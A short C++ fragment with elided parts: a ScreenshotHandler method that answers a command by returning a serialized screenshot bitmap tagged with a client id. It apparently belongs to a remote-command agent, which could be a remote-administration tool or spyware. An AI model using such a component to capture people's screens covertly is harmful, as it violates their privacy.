...
std::unique_ptr<IRequest> ScreenshotHandler::handle(std::shared_ptr<BasicCommand>& command)
{
	...
	return std::make_unique<ReturnProductRequest>(RequestHeader{RequestType::ReturnProduct, m_client_id},
	                                              command->get_command_id(),
	                                              ScreenshotProduct(command->get_command_id(), CommandType::Screenshot,
	                                                                std::move(bmp_buffer)).serialize());
}
